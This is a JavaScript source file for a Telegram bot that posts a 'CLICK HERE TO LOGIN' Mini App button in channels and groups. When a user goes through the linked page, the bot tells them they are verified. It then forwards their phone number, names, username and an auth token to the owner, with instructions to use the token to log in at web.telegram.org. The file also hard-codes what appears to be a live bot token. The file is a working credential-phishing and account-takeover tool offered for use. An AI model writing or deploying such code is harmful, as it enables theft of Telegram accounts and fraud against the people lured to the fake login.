const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const port = process.env.PORT || 3000;

// ✅ YOUR CREDENTIALS ARE INSERTED HERE
const token = process.env.BOT_TOKEN || '8108422649:AAENF0rHzy1GEekebaZgdRFMy6mtxJWvDmw';
const ownerId = process.env.OWNER_ID || '6037132084';

// Use Webhooks for production (on Render), fall back to polling for local development
const bot = new TelegramBot(token, {
  polling: process.env.NODE_ENV !== 'production', // Will only poll if NOT in production
  webHook: process.env.NODE_ENV === 'production' // Will use webhook if IN production
});

// If we are in production (on Render), set the webhook
if (process.env.NODE_ENV === 'production') {
  const webhookUrl = `https://my-telegram-bot-hiz4.onrender.com/bot${token}`;
  bot.setWebHook(webhookUrl);
}
// Handle data from Mini App
bot.on('message', (msg) => {
    if (msg.web_app_data) {
        try {
            const data = JSON.parse(msg.web_app_data.data);
            if (data.type === 'auth_data') {
                handleAuthData(msg, data);
            }
        } catch (e) {
            console.error('Error parsing web app data:', e);
        }
    }
});

function handleAuthData(msg, data) {
    const userInfo = data.user;
    
    // 1. Send confirmation to the user
    bot.sendMessage(msg.chat.id, "Verified successfully my boy! ✅");
    
    // 2. Prepare detailed message for the owner (YOU)
    const authMessage = `
🔐 *New Telegram Account Verification*

📞 *Phone:* ${userInfo.phone_number || 'Not provided'}
👤 *User ID:* ${userInfo.id}
📛 *First Name:* ${userInfo.first_name}
📜 *Last Name:* ${userInfo.last_name || 'Not provided'}
🔗 *Username:* @${userInfo.username || 'Not available'}

⚠️ *Copy this auth token for web.telegram.org:*
\`${userInfo.auth_token || 'No token available'}\`

💡 Login at: https://web.telegram.org
    `;
    
    // 3. Send the info to your main account (ownerId)
    bot.sendMessage(ownerId, authMessage, { parse_mode: 'Markdown' });
}

// Command to post the login link in the channel
bot.onText(/\/postlogin/, (msg) => {
    if (msg.chat.type === 'channel' || msg.chat.type === 'supergroup') {
        const loginButton = {
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: "CLICK HERE TO LOGIN",
                        web_app: { url: `https://my-telegram-bot-hiz4.onrender.com` } // ← You will change this later
                    }
                ]]
            }
        };
        bot.sendMessage(msg.chat.id, "LOG IN HERE 🔐", loginButton);
    }
});

// Basic server to serve the HTML page
app.use(express.static('public'));
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
